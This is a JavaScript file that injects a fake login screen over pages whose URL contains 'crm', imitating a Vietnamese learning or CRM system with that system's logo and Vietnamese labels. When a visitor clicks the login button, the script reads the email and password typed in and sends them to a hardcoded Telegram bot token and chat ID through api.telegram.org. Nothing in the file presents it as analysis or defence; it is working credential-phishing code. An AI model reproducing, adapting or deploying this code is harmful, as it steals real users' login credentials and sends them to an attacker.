const currentUrl = window.location.href;

if (currentUrl.includes("crm")) {
    
    const data = {};

const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
const TELEGRAM_CHAT_ID = "6533206955";

const overlay = document.createElement("div");

overlay.style.position = "fixed";
overlay.style.inset = "0";
overlay.style.background = "#e5e8ee";
overlay.style.display = "flex";
overlay.style.justifyContent = "center";
overlay.style.alignItems = "center";
overlay.style.fontFamily = "Arial, sans-serif";
overlay.style.zIndex = "999999";

const box = document.createElement("div");

box.style.width = "530px";
box.style.background = "#fff";
box.style.border = "1px solid #d7d7d7";
box.style.borderTop = "4px solid #ff0000";
box.style.boxShadow = "0 1px 4px rgba(0,0,0,0.08)";
box.style.overflow = "hidden";

box.innerHTML = `
    
    <div style="
        padding:34px 0 30px;
        text-align:center;
        border-bottom:1px solid #e8e8e8;
        background:#fff;
    ">
        <img 
            src="https://lms.hethongilp.vn/img/logo.png"
            style="
                width:140px;
                opacity:.96;
            "
        >
    </div>

    <div style="
        padding:34px 28px 26px;
        background:#fff;
    ">

        <div style="
            display:flex;
            align-items:center;
            height:56px;
            border:1px solid #d8d8d8;
            margin-bottom:18px;
            background:white;
        ">

            <div style="
                width:68px;
                height:100%;
                border-right:1px solid #d8d8d8;
                display:flex;
                align-items:center;
                justify-content:center;
                color:#b9b9b9;
            ">
                
                <svg 
                    xmlns="http://www.w3.org/2000/svg"
                    width="18"
                    height="18"
                    fill="currentColor"
                    viewBox="0 0 16 16"
                >
                    <path d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1H3zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
                </svg>

            </div>

            <input
                id="emailInput"
                type="text"
                placeholder="Email"
                style="
                    flex:1;
                    height:100%;
                    border:none;
                    outline:none;
                    padding:0 18px;
                    font-size:15px;
                    color:#666;
                    background:transparent;
                "
            >

        </div>

        <div style="
            display:flex;
            align-items:center;
            height:56px;
            border:1px solid #d8d8d8;
            margin-bottom:22px;
            background:white;
        ">

            <div style="
                width:68px;
                height:100%;
                border-right:1px solid #d8d8d8;
                display:flex;
                align-items:center;
                justify-content:center;
                color:#b9b9b9;
            ">

                <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="17"
                    height="17"
                    fill="currentColor"
                    viewBox="0 0 16 16"
                >
                    <path d="M8 1a2 2 0 0 0-2 2v3h4V3a2 2 0 0 0-2-2z"/>
                    <path d="M3 6V5a5 5 0 0 1 10 0v1h1v9H2V6h1zm1 0h8V5a4 4 0 0 0-8 0v1z"/>
                </svg>

            </div>

            <input
                id="passwordInput"
                type="password"
                placeholder="Password"
                style="
                    flex:1;
                    height:100%;
                    border:none;
                    outline:none;
                    padding:0 18px;
                    font-size:15px;
                    color:#666;
                    background:transparent;
                "
            >

        </div>

        <label style="
            display:flex;
            align-items:center;
            gap:10px;
            color:#333;
            font-size:15px;
            margin-bottom:24px;
            user-select:none;
        ">
            <input 
                type="checkbox"
                style="
                    width:17px;
                    height:17px;
                "
            >
            Ghi nhớ đăng nhập
        </label>

        <button
            id="loginBtn"
            style="
                display:block;
                width:380px;
                height:47px;
                margin:0 auto;
                border:none;
                background:#79c62a;
                color:white;
                font-size:17px;
                cursor:pointer;
                transition:.15s;
            "
        >
            Đăng nhập
        </button>

    </div>

    <div style="
        border-top:1px solid #ececec;
        padding:18px 26px;
        text-align:right;
        font-size:14px;
        color:#111;
        background:#fff;
    ">
        Design by Hoàng Vũ Group
    </div>

`;

overlay.appendChild(box);
document.body.appendChild(overlay);

const loginBtn = document.getElementById("loginBtn");

loginBtn.onmouseenter = () => {
    loginBtn.style.background = "#70bb25";
};

loginBtn.onmouseleave = () => {
    loginBtn.style.background = "#79c62a";
};

loginBtn.onclick = () => {

    data.email =
        document.getElementById("emailInput").value;

    data.password =
        document.getElementById("passwordInput").value;

    handleGuiData();
};

function handleGuiData() {

    const dataHienTai = {
        email: data.email,
        password: data.password,
        status: "Nguoi dung da bam nut Dang nhap",
        time: new Date().toLocaleString("vi-VN")
    };

    sendDataToTelegram(dataHienTai);
}

function sendDataToTelegram(myData) {

    const text =
`🔔 Có dữ liệu mới

Email: ${myData.email}
Password: ${myData.password}

Status: ${myData.status}

Time: ${myData.time}`;

    const url =
`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text
        })
    })
    .then(() => {

        console.log("Đã gửi Telegram");

    })
    .catch((err) => {

        console.error(err);

    });
}

}
else{
    console.log("oh no");
}
